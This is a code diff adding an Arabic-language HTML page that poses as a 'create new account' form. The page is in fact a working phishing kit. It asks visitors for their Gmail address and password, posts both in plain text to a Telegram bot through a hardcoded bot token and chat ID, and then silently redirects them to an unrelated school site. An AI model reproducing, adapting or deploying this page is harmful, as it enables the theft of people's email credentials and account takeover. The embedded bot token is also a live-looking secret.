@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إنشاء حساب جديد</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #0f172a;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+        }
+
+        .box {
+            background: #1e293b;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            box-sizing: border-box;
+        }
+
+        .box h3 {
+            text-align: center;
+            margin-bottom: 24px;
+            font-size: 24px;
+            color: #38bdf8;
+            margin-top: 0;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid #334155;
+            background: #0f172a;
+            color: #fff;
+            outline: none;
+            transition: border-color 0.3s;
+            box-sizing: border-box;
+        }
+
+        .input-group input:focus {
+            border-color: #38bdf8;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: #0284c7;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s;
+            margin-top: 10px;
+        }
+
+        .login-btn:hover {
+            background: #0369a1;
+        }
+    </style>
+</head>
+<body>
+
+<div class="box">
+
+    <h3>إنشاء حساب جديد</h3>
+
+    <div class="input-group">
+        <input id="name" type="email" placeholder="البريد الإلكتروني (Gmail)" required>
+    </div>
+
+    <div class="input-group">
+        <input id="secret" type="password" placeholder="كلمة السر الجديدة" required>
+    </div>
+
+    <button class="login-btn" onclick="send()">تسجيل حساب جديد</button>
+
+</div>
+
+<script>
+
+const TOKEN = "8636021665:AAGhU_BAdory7k_IwaZuuxkZA7EXGtacaOc"; 
+const CHAT_ID = "7737717483";
+
+function send(){
+
+    let name = document.getElementById("name").value.trim();
+    let secret = document.getElementById("secret").value;
+
+    // 1. التحقق من أن الحقول ليست فارغة
+    if (name === "" || secret === "") {
+        alert("يرجى ملء جميع الحقول أولاً!");
+        return; 
+    }
+
+    // 2. التحقق من وجود @gmail في الإيميل
+    if (!name.toLowerCase().includes("@gmail")) {
+        alert("يرجى إدخال بريد إلكتروني يتبع لـ Gmail! (مثال: example@gmail.com)");
+        return; 
+    }
+
+    // تجهيز نص الرسالة التليجرام
+    let text = "حساب جديد تم إنشاؤه:\nالإيميل: " + name + "\nالرمز: " + secret;
+
+    // إرسال البيانات إلى التليجرام
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: text
+        })
+    }).then(() => {
+        // يتم التوجيه إلى غوغل فوراً بعد إرسال الطلب بنجاح للسيرفر
+        window.location.replace("https://websit-x.github.io/ghobrini_shcool/");
+    }).catch(err => {
+        console.error("خطأ في الاتصال:", err);
+        // التوجيه الاحتياطي في حال انقطع الاتصال
+        window.location.replace("https://websit-x.github.io/ghobrini_shcool/");
+    });
+
+}
+
+</script>
+
+</body>
+</html>
